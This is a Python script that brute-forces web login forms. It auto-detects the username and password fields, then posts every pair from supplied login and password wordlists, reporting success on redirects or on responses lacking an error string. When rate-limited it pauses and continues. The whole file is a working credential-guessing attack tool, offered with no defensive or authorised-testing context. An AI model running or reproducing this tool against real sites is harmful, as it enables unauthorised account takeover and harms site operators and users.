import requests
from tqdm import tqdm
import argparse
import os
import sys
import time
from bs4 import BeautifulSoup

def detect_fields(url):
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find("form")
        if not form:
            print("[!] any form found")
            sys.exit(1)
        inputs = form.find_all("input")
        user_field = None
        pass_field = None

        for i in inputs:
            name = i.get("name", "")
            input_type = i.get("type", "").lower()
            id_attr = i.get("id", "").lower()
            placeholder = i.get("placeholder", "").lower()
            if not user_field and ("user" in name.lower() or "login" in name.lower() or "user" in id_attr or "login" in placeholder):
                user_field = name

            if not pass_field and ("pass" in name.lower() or input_type == "password" or "pass" in id_attr or "password" in placeholder):
                pass_field = name
        if not user_field or not pass_field:
            print("[!] unable to detect form fields")
            sys.exit(1)

        print(f"[+] field detected: user = {user_field} | password = {pass_field}")
        return user_field, pass_field
    except requests.RequestException as e:
        print(f"[!] unable to connect to URL: {e}")
        sys.exit(1)

def args_parse():
    parser = argparse.ArgumentParser(description="-----------------------------< BruteForce HTTP/HTTPS >-----------------------------")
    parser.add_argument("-url", required=True, help="URL of the login page")
    parser.add_argument("-logins", required=True, help="File for all the logins test")
    parser.add_argument("-passwords", required=True, help="File for all the passwords test")
    return parser.parse_args()

def exist_file(file_path):
    if not os.path.isfile(file_path):
        print(f"[!] File not found: {file_path}")
        sys.exit(1)

args = args_parse()

exist_file(args.logins)
exist_file(args.passwords)
with open(args.logins) as f:
    logins = [line.strip() for line in f]
with open(args.passwords) as p:
    passwords = [line.strip() for line in p]
username_field, password_field = detect_fields(args.url)

session = requests.Session()

for login in tqdm(logins, desc="Test pour chaque identifiants"):
    for password in passwords:
        data = {
            username_field : login,
            password_field : password,
        }
        try:

            response = session.post(args.url, data=data, allow_redirects=False, timeout=5)
            if response.status_code in  [301, 302, 303, 307, 308]:
                print(f"[+] SUCCESS: {login} / {password}")
                exit(0)
            elif response.status_code == 200:
                if "erreur" not in response.text:
                    print(f"[?] maybe SUCCESS: {login} / {password}")
                    sys.exit(0)
                else:
                    print(f"[!] invalid credentials: {login} / {password}")
            elif response.status_code == 400:
                print(f"[!] bad request error(400): {login} / {password}")
            elif response.status_code == 401:
                print(f"[!] not authorized access error(401): {login} / {password}")
            elif response.status_code == 403:
                print(f"[!] forbidden access error(403): {login} / {password}")
            elif response.status_code == 404:
                print(f"[!] page not found error(404): {login} / {password}")
            elif response.status_code == 429:
                print(f"[!] too much attempt error(429): {login} / {password}")
                time.sleep(5)
            elif response.status_code >= 500:
                print(f"[!] server error error({response.status_code}): {login} / {password}")
            else:
                print(f"[?] HTTP receive error({response.status_code}): {login} / {password}")
        except requests.exceptions.RequestException as e:
            print(f"[!] connexion error : {e}")